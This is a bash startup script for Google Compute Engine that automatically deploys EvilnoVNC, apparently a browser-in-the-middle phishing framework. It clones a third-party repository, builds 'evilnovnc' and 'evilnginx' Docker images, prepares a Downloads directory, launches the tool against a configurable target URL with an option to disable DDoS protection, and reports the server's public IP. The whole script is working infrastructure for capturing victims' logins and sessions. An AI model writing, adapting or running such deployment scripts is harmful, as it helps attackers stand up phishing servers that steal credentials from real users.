#!/bin/bash
# Google Compute Engine Startup Script for EvilnoVNC
# This script automatically sets up and starts the EvilnoVNC application

set -e

echo "=== EvilnoVNC GCE Startup Script ==="
echo "Starting deployment at $(date)"

# Variables - Update these with your configuration
REPO_URL="https://github.com/therealelyayo/flashedcook.git"
INSTALL_DIR="/opt/flashedcook"
TARGET_URL="${TARGET_URL:-https://example.com}"  # Set via metadata or environment
DDOS_PROTECTION="${DDOS_PROTECTION:-enabled}"    # Set to 'disabled' to turn off

# Check if Docker is installed
if ! command -v docker &> /dev/null; then
    echo "Installing Docker..."
    curl -fsSL https://get.docker.com -o get-docker.sh
    sh get-docker.sh
    rm get-docker.sh
    systemctl enable docker
    systemctl start docker
    echo "Docker installed successfully"
else
    echo "Docker is already installed"
fi

# Check if Git is installed
if ! command -v git &> /dev/null; then
    echo "Installing Git..."
    apt-get update
    apt-get install -y git
    echo "Git installed successfully"
else
    echo "Git is already installed"
fi

# Clone or update repository
if [ -d "$INSTALL_DIR" ]; then
    echo "Repository already exists, updating..."
    cd "$INSTALL_DIR"
    git pull origin main || git pull origin master
else
    echo "Cloning repository..."
    git clone "$REPO_URL" "$INSTALL_DIR"
    cd "$INSTALL_DIR"
fi

# Build Docker images
echo "Building Docker images..."
docker build -f evilnovnc.Dockerfile -t evilnovnc . || {
    echo "Failed to build evilnovnc image"
    exit 1
}

docker build -f nginx.Dockerfile -t evilnginx . || {
    echo "Failed to build evilnginx image"
    exit 1
}

# Create Downloads directory with proper permissions
echo "Setting up Downloads directory..."
mkdir -p Downloads
chown -R 103 Downloads

# Stop any existing containers
echo "Cleaning up existing containers..."
docker stop evilnginx 2>/dev/null || true
docker rm evilnginx 2>/dev/null || true
docker ps -a -q --filter ancestor=evilnovnc | xargs -r docker stop
docker ps -a -q --filter ancestor=evilnovnc | xargs -r docker rm
docker network rm nginx-evil 2>/dev/null || true

# Start the application
echo "Starting EvilnoVNC application..."
if [ "$DDOS_PROTECTION" = "disabled" ]; then
    ./start_auto.sh "$TARGET_URL" --no-ddos-protection &
else
    ./start_auto.sh "$TARGET_URL" &
fi

# Wait for application to start
sleep 10

# Check if containers are running
if docker ps | grep -q evilnginx; then
    echo "✓ EvilnoVNC started successfully!"
    echo "Application is accessible at http://$(curl -s http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip -H "Metadata-Flavor: Google")"
else
    echo "✗ Failed to start EvilnoVNC"
    echo "Check logs: docker logs evilnginx"
    exit 1
fi

echo "Startup script completed at $(date)"
